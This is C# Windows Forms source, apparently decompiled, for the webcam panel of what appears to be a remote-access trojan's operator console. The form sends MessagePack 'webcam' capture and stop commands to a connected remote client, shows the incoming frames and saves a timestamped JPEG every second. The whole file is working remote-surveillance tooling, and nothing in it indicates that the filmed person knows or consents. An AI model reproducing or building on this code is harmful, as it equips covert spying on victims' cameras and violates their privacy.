using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;

namespace Server.Forms;

public class FormWebcam : Form
{
	public Stopwatch sw = Stopwatch.StartNew();

	public int FPS;

	public bool SaveIt;

	private IContainer components;

	private Panel panel1;

	public ComboBox comboBox1;

	public PictureBox pictureBox1;

	public Button btnSave;

	public Button button1;

	public System.Windows.Forms.Timer timer1;

	private System.Windows.Forms.Timer timerSave;

	public Label labelWait;

	private Label label1;

	public NumericUpDown numericUpDown1;

	public Form1 F { get; set; }

	internal Clients Client { get; set; }

	internal Clients ParentClient { get; set; }

	public string FullPath { get; set; }

	public Image GetImage { get; set; }

	public FormWebcam()
	{
		InitializeComponent();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		try
		{
			if (button1.Tag == "play")
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "webcam";
				msgPack.ForcePathObject("Command").AsString = "capture";
				msgPack.ForcePathObject("List").AsInteger = comboBox1.SelectedIndex;
				msgPack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value);
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				button1.Tag = "stop";
				button1.BackgroundImage = Resources.stop__1_;
				numericUpDown1.Enabled = false;
				comboBox1.Enabled = false;
				btnSave.Enabled = true;
			}
			else
			{
				button1.Tag = "play";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "webcam";
				msgPack2.ForcePathObject("Command").AsString = "stop";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
				button1.BackgroundImage = Resources.play_button;
				btnSave.BackgroundImage = Resources.save_image;
				numericUpDown1.Enabled = true;
				comboBox1.Enabled = true;
				btnSave.Enabled = false;
				timerSave.Stop();
			}
		}
		catch
		{
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	private void FormWebcam_FormClosed(object sender, FormClosedEventArgs e)
	{
		try
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				Client?.Disconnected();
			});
		}
		catch
		{
		}
	}

	private void BtnSave_Click(object sender, EventArgs e)
	{
		if (button1.Tag != "stop")
		{
			return;
		}
		if (SaveIt)
		{
			SaveIt = false;
			btnSave.BackgroundImage = Resources.save_image;
			return;
		}
		btnSave.BackgroundImage = Resources.save_image2;
		try
		{
			if (!Directory.Exists(FullPath))
			{
				Directory.CreateDirectory(FullPath);
			}
			Process.Start(FullPath);
		}
		catch
		{
		}
		SaveIt = true;
	}

	private void TimerSave_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(FullPath))
			{
				Directory.CreateDirectory(FullPath);
			}
			pictureBox1.Image.Save(FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormWebcam));
		this.panel1 = new System.Windows.Forms.Panel();
		this.comboBox1 = new System.Windows.Forms.ComboBox();
		this.btnSave = new System.Windows.Forms.Button();
		this.button1 = new System.Windows.Forms.Button();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.timerSave = new System.Windows.Forms.Timer(this.components);
		this.labelWait = new System.Windows.Forms.Label();
		this.label1 = new System.Windows.Forms.Label();
		this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
		this.panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown1).BeginInit();
		base.SuspendLayout();
		this.panel1.BackColor = System.Drawing.Color.Transparent;
		this.panel1.Controls.Add(this.label1);
		this.panel1.Controls.Add(this.numericUpDown1);
		this.panel1.Controls.Add(this.comboBox1);
		this.panel1.Controls.Add(this.btnSave);
		this.panel1.Controls.Add(this.button1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.panel1.Location = new System.Drawing.Point(0, 0);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(799, 41);
		this.panel1.TabIndex = 3;
		this.comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBox1.Enabled = false;
		this.comboBox1.FormattingEnabled = true;
		this.comboBox1.Location = new System.Drawing.Point(71, 7);
		this.comboBox1.Name = "comboBox1";
		this.comboBox1.Size = new System.Drawing.Size(272, 28);
		this.comboBox1.TabIndex = 6;
		this.btnSave.BackgroundImage = Server.Properties.Resources.save_image;
		this.btnSave.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.btnSave.Enabled = false;
		this.btnSave.Location = new System.Drawing.Point(568, 4);
		this.btnSave.Name = "btnSave";
		this.btnSave.Size = new System.Drawing.Size(32, 32);
		this.btnSave.TabIndex = 5;
		this.btnSave.UseVisualStyleBackColor = true;
		this.btnSave.Click += new System.EventHandler(BtnSave_Click);
		this.button1.BackgroundImage = Server.Properties.Resources.play_button;
		this.button1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.button1.Enabled = false;
		this.button1.Location = new System.Drawing.Point(12, 4);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(32, 32);
		this.button1.TabIndex = 0;
		this.button1.Tag = "play";
		this.button1.UseVisualStyleBackColor = true;
		this.button1.Click += new System.EventHandler(Button1_Click);
		this.pictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.pictureBox1.Location = new System.Drawing.Point(0, 41);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(799, 532);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 5;
		this.pictureBox1.TabStop = false;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.timerSave.Interval = 1000;
		this.timerSave.Tick += new System.EventHandler(TimerSave_Tick);
		this.labelWait.AutoSize = true;
		this.labelWait.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.labelWait.Location = new System.Drawing.Point(319, 273);
		this.labelWait.Name = "labelWait";
		this.labelWait.Size = new System.Drawing.Size(78, 29);
		this.labelWait.TabIndex = 6;
		this.labelWait.Text = "Wait...";
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(374, 10);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(78, 20);
		this.label1.TabIndex = 8;
		this.label1.Text = "QUALITY";
		this.numericUpDown1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.numericUpDown1.Enabled = false;
		this.numericUpDown1.Increment = new decimal(new int[4] { 10, 0, 0, 0 });
		this.numericUpDown1.Location = new System.Drawing.Point(458, 8);
		this.numericUpDown1.Minimum = new decimal(new int[4] { 20, 0, 0, 0 });
		this.numericUpDown1.Name = "numericUpDown1";
		this.numericUpDown1.Size = new System.Drawing.Size(82, 26);
		this.numericUpDown1.TabIndex = 7;
		this.numericUpDown1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.numericUpDown1.UpDownAlign = System.Windows.Forms.LeftRightAlignment.Left;
		this.numericUpDown1.Value = new decimal(new int[4] { 50, 0, 0, 0 });
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(799, 573);
		base.Controls.Add(this.labelWait);
		base.Controls.Add(this.pictureBox1);
		base.Controls.Add(this.panel1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "FormWebcam";
		this.Text = "FormWebcam";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormWebcam_FormClosed);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown1).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
